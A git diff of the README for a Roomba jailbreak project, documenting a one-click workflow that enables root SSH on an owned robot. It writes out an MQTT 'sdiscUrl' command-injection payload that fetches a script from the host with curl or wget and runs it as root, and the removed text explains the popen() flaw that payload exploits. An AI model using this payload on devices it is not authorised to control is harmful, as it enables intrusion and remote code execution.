@@ -1,130 +1,141 @@
-# roomba::unjailed
+# roomba::unjailed — runtime SSH workflow
 
-These are the scripts for the roomba::unjailed project, a jailbreak for most `lewis` Roomba models (i,j series), with more support to come.
+This host workflow follows the owner's successful **30 October 2026 handoff**:
+Roomba j9/j9+, SKU j915840, firmware
+`ruby+24.29.1-2024-08-01-9510a0d1e65+Release+54`.
+The handoff reports root execution, an `SSH-2.0-OpenSSH_8.2` banner and an SSH
+login. This repository correction has been exercised **offline**, not freshly on
+that robot. Other firmware/models are not established by these tests.
 
-> Using this jailbreak will not make your Roomba less secure, unless you expose ports `1883` (internal MQTT broker) or `22` (runjailed SSH server). These allow unrestricted access to the `cleantrack` daemon, with no root password.
+Use only on an owned/authorized robot, from a trusted LAN. Root SSH access changes
+the device's security boundary. Do not expose it to the Internet. The existing
+MQTT TLS configuration disables certificate verification for the expired device
+certificate; it does not authenticate the broker's identity.
 
-## Supported Versions
+## Run from the host
 
-- 22.52.08+
-- Everything else is untested!!
-
-## Introduction
-
-`runjailed.py` is the Python host script, as Roomba has Python 2.7 pre-installed.
-
-`jailbreak.py` jailbreaks a Roomba, and downloads `runjailed.py` to it.
-
-The exploit takes advantage of a MQTT input sanitization vulnerability, gaining ACE as the `apps` user.
-
-Luckily for us, the Roomba is based on BusyBox, so it has `busybox.suid`, and it's one of the few commands `apps` is allowed to run.
-
-We use the ACE vulnerability to gain root access and download the `runjailed` script, which performs the rest of the jailbreak with the included scripts.
-
-## Features
-
-| Feature | Status |
-|---------|--------|
-| Root ACE | ✅ |
-| SSH, FTP | ✅ |
-| Exfiltrate PMap data | ✅ |
-| Expose new internal MQTT messages to the public | 🛠️ |
-| Expose Timeline Report to the public | 🛠️ |
-| Communication with mobility/auxiliary boards | 🛠️ |
-| Downgrading | ⚠️ |
-
-🛠️: WIP  
-⚠️: WIP, risky  
-
-## One-click SSH
-
-`oneclick-ssh.sh` enables SSH on the robot in a single run: it serves `scripts/`
-over HTTP, publishes the `sdiscUrl` payload over the robot's local MQTT broker
-(port 8883, TLS), collects the beacons, and waits until TCP/22 answers.
+Requires Python 3.10+, Bash and the dependencies in `requirements.txt`:
 
 ```sh
-# credentials either interactive, via env, or via flags
-read -rs ROOMBA_PASSWORD && export ROOMBA_PASSWORD   # robot password (not the iRobot account one)
-export ROOMBA_BLID=<blid>
+python3 -m venv .venv
+.venv/bin/python -m pip install -r runjailed/requirements.txt
+export PYTHON="$PWD/.venv/bin/python"
 
-./runjailed/oneclick-ssh.sh 192.168.178.50
+# Network-free payload check: no credentials, DNS, listener or MQTT publish.
+./runjailed/oneclick-ssh.sh 192.0.2.1 --host-ip 192.0.2.2 --dry-run
+
+# Actual activation — substitute the real robot and this host's LAN addresses.
+# Enter credentials interactively, or provide ROOMBA_BLID/ROOMBA_PASSWORD via
+# your authorized environment. Never retrieve them from old logs or histories.
+./runjailed/oneclick-ssh.sh ROBOT_IPV4 --host-ip HOST_IPV4 --timeout 120
 ```
 
-Options: `--blid`, `--password`, `--host-ip`, `--http-port` (8899),
-`--beacon-port` (8883), `--ssh-port` (22), `--timeout` (120), `--dry-run`
-(prints the payload only). `PYTHON=/path/to/venv/bin/python` selects the
-interpreter if the default one lacks `paho-mqtt`
-(`pip install -r runjailed/requirements.txt`).
+The default host address is the OS route's source address toward the robot, not
+an Internet probe. `--host-ip` must name an interface on this computer. Live mode
+also accepts a valid hostname resolving to exactly one IPv4 address; resolution
+has a five-second deadline and only the resulting literal enters the payload and
+firewall rules. Dry-run requires a literal host IPv4 and does no DNS resolution.
+The robot address must always be a numeric IPv4.
 
-With `--no-serve` the script does not start a local file server and expects
-`HOST:HTTP_PORT` to serve `runjailed/scripts/` already:
+A **single local HTTP listener on port 8883** serves both `enableSSH.sh` and
+`sshd.socket` and receives the beacons. MQTT/TLS on **robot:8883** is on a different
+host; it does not conflict with **host:8883 HTTP**. The handoff's packet trace
+identified robot return-path filtering for host source port 8899; 8883 worked.
+A host self-probe is not evidence of reachability from the robot.
+
+Options include `--blid`, `--password` (prefer prompt/environment to command-line
+secrets), `--host-ip`, `--http-port` (8883), `--beacon-port` (legacy alias, must
+match the shared HTTP port), `--ssh-port` (probe only, normally 22), `--timeout`
+(120 seconds after local send), and `--dry-run`. The robot unit always listens on
+22; changing the probe port does not reconfigure it. `--no-serve` is deliberately
+unsupported: a separate file server cannot supply this attempt's integrated
+observations. `--linger` applies only to manual `--send`, not SSH verification.
+There is no production-server or host-firewall setup in these scripts.
+
+Equivalent direct invocation:
 
 ```sh
-./runjailed/oneclick-ssh.sh <ROBOT-IP> --host-ip <PUBLIC-HOST> --http-port 8899 --no-serve
+"$PYTHON" runjailed/runjailed.py --ip ROBOT_IPV4 --enable-ssh HOST_IPV4
 ```
 
-The robot then fetches the script from the public host and beacons back to
-`HOST:BEACON_PORT`, which must be reachable from the robot as well.
+## Device contract and scope
 
-Exit codes: `0` SSH reachable, `3` payload ran as root but the port is still
-closed (the firewall picks up `SYSTEM_ACCESS="unlocked"` on the next start of
-the connectivity services — reboot the robot and retry), `1` failure, `2` usage.
+- External topic **`wifictl`**, MQTT **3.1.1**, BLID as username **and client ID**,
+  QoS **0**, retain **false**, JSON `{"state":{"sdiscUrl":"…"}}`.
+  The handoff reports that `local_manager` unwraps `state` and forwards internally
+  over `local/delta`. That internal name does not exclude external `wifictl`.
+- The complete `sdiscUrl` field is limited to **191 UTF-8 bytes**. The bootstrap
+  uses `/bin/busybox.suid su -c` and `/usr/bin/curl`, not `wget` or plain busybox.
+  Example shape (addresses are validated numeric literals):
 
-The payload the robot receives is one `sdiscUrl` string, at most 191 bytes:
+  ```text
+  https://$(/bin/busybox.suid su -c '/usr/bin/curl -fsS -m15 -o /tmp/e http://HOST:8883/enableSSH.sh&&sh /tmp/e HOST 8883')
+  ```
 
-```
-https://$(/bin/busybox su -c 'wget -qO/tmp/e http://HOST:8899/enableSSH.sh;sh /tmp/e HOST 8899 8883')
-```
+  The `&&` prevents executing an old `/tmp/e` if the download fails.
+- `scripts/enableSSH.sh` rejects non-root execution and invalid callback/port
+  arguments. It sends `/whoami/root`, downloads `sshd.socket` using bounded curl,
+  copies the socket unit **only to `/run/systemd/system`**, reloads systemd and
+  **starts**, rather than persistently enables, the unit. It relies on the
+  firmware's existing SSH service implementation.
+- Additional firewall ACCEPT rules are strictly INPUT `tcp --dport 22 -s HOST`
+  and OUTPUT `tcp --sport 22 -d HOST`. Exact existing rules are checked first.
+  No rules are flushed, deleted or broadly replaced. No provisioning,
+  `SYSTEM_ACCESS`, firmware image or cloud-discovery configuration is modified.
+  The socket override and added rules expire on robot reboot. Partial failures
+  may leave these narrow runtime changes; there is no broad rollback/cleanup.
+- Other historical scripts in this directory are **not** part of this supported
+  workflow. Legacy chunking/root helpers remain explicit errors directing callers
+  to `--enable-ssh`.
 
-`connectivity_manager` interpolates that value into
-`echo "%s" | egrep -e '^https+[^;[:space:]]+$'` and runs it through `popen()`;
-the double quotes do not stop `$(...)`, so the command runs before the URL is
-validated. Same process, same 191-byte limit for every manual send:
-`runjailed.py --send '<url>'` or `--enable-ssh HOST[:PORT]`.
+## What counts as success
 
-## MQTT lifecycle regression checks (offline)
+Oneclick delegates the entire lifecycle to `runjailed.py`; it does not grep an
+obsolete local-publish string or retry the payload. Exit codes:
 
-`runjailed.py` uses Paho's `loop_start()` thread as the network writer. The main
-thread publishes only after a successful CONNACK and retains each
-`MQTTMessageInfo` until `wait_for_publish(timeout=5)` and `is_published()` confirm
-its complete **local socket send**. QoS 0 has no broker acknowledgement: this
-is not proof of robot processing, script execution, root access, or working SSH.
-The topic (`delta`), `state.sdiscUrl` JSON, and QoS 0/non-retained header (`0x30`)
-are unchanged. The public `sendCmd()` helper still returns a local-enqueue bool.
+| Code | Meaning |
+|---|---|
+| 0 | In SSH mode: requested bootstrap **and socket-unit downloads**, exact `/whoami/root`, exact `/done/ssh`, **and a complete SSH protocol banner** were observed. Dry-run 0 only validates the payload. |
+| 1 | HTTP listener, connection, authentication, disconnect or local-send failure. |
+| 2 | Invalid/missing arguments or credentials. |
+| 3 | Local MQTT send completed, but device verification timed out; missing observations/banner are reported. |
 
-TCP/TLS connection establishment uses Paho's 10-second connect timeout, followed
-by a separate 10-second CONNACK limit. Use a numeric robot IP as documented;
-OS hostname resolution is not covered by Paho's socket timeout. Authentication,
-disconnect, enqueue, and local-send failures terminate nonzero without reconnect
-or publish retries. Send delays and beacon linger must be finite and nonnegative.
-Cleanup disconnects, allows up to one second for graceful network shutdown, then
-unblocks a stalled socket before joining the Paho loop. The HTTP beacon server is
-also shut down. Without `--send`/`--enable-ssh`, passive monitoring remains active
-until disconnect or interruption.
+Observations must come from the configured robot IP during this publish attempt;
+other sources, pre-publish requests, substring matches and query-suffixed beacons
+cannot establish success. This assumes a direct trusted LAN, not a NAT/relay that
+changes the robot's source IP. HTTP beacons are **not authenticated attestations**.
+The SSH banner is checked even if TCP/22 already accepts connections; a click,
+MQTT return code, root beacon or open TCP port alone is insufficient. A verified
+banner is still not proof of a successful SSH login; no login is attempted.
 
-Run the suite from the repository root with a Python environment containing
-`pytest` and `runjailed/requirements.txt`:
+Paho retains the robust `loop_start()` single-writer lifecycle, waits for CONNACK,
+and bounds each complete local send. TCP/TLS connect and CONNACK each have a
+10-second limit; local publish has five seconds. Cleanup allows one second for
+Paho before unblocking a stuck socket, stops the loop, and closes the HTTP server.
+HTTP request workers are daemon threads with socket timeouts, so an incomplete
+request does not hold up server shutdown. No reconnect or automatic republish is
+performed. SSH probing alone is polled within `--timeout`.
+
+Manual `--send URL` still returns 0 for a **local send only** and explicitly says
+that device execution was not verified. With neither send nor SSH activation,
+passive monitoring intentionally runs until disconnect/interruption.
+
+## Offline verification
 
 ```sh
-python -m pytest -q
+python -m pytest -q -W error
+bash -n runjailed/oneclick-ssh.sh
+sh -n runjailed/scripts/enableSSH.sh
+git diff --check
 ```
 
-The real-Paho regression uses only an in-process socketpair, not TLS, a TCP
-listener, or a robot. It caps writes at three bytes and pauses a partial
-SUBSCRIBE while the main thread queues PUBLISH. It checks one network writer and
-byte-exact, noninterleaved SUBSCRIBE/PUBLISH/DISCONNECT packets. Additional real
-Paho cases cover rejected authentication, missing CONNACK, peer loss, and a
-permanently unwritable publish (including bounded cleanup); CLI tests cover
-failure exits, delays, credentials from the environment, and legacy options.
-
-## Scripts
-
-> `runjailed` and these scripts assume you already have obtained root access. Note that you can perform most of the scripts anyways using the BusyBox SUID script, but it's better to have root anyway.
-
-- `oneclick-ssh.sh`: Host script — serves the scripts, sends the MQTT payload, waits for SSH (see above).
-- `enableSSH.sh`: Runs on the robot as root: fetches `sshd.socket`, unlocks `SYSTEM_ACCESS`, enables the socket unit.
-- `jailbreak.sh`: The initial script, only ran once by `jailbreak.py`, runs `sshd.sh` to begin an SSH server for a more stable connection.
-- `enableDevMode.sh`: Sets the provisioning configuration key `DEV_MODE` to `enabled` from `disabled`.
-- `ftp.sh`: Uses `tcpsvd` to host a simple FTPd server with write access from the `/` root on port 21.
-- `sshd.sh`: Opens a SSH server on port 21.
-- `unlock.sh`:  Sets the provisioning configuration key `SYSTEM_ACCESS` to `unlocked` from `locked`. This brings down the strict firewall rules.
+Tests exercise the real CLI dry-run/error paths, actual localhost HTTP downloads
+and beacon routing, complete/non-SSH/silent banner sockets, source/attempt
+attribution, and real Paho serialization/network-loop behavior over a socketpair
+(including forced short writes and bounded failures). Integrated host tests use a
+**synthetic device boundary** to check verified exit 0 versus missing-root exit 3.
+Robot shell tests use isolated command-recording fakes and temporary writable
+paths: they never change the host's real firewall, services or provisioning.
+These tests are **not firmware/hardware evidence**. The remaining live boundary
+is one authorized run against the actual robot, observing its requested download,
+root and done beacons and SSH banner; a fresh SSH login needs separate verification.
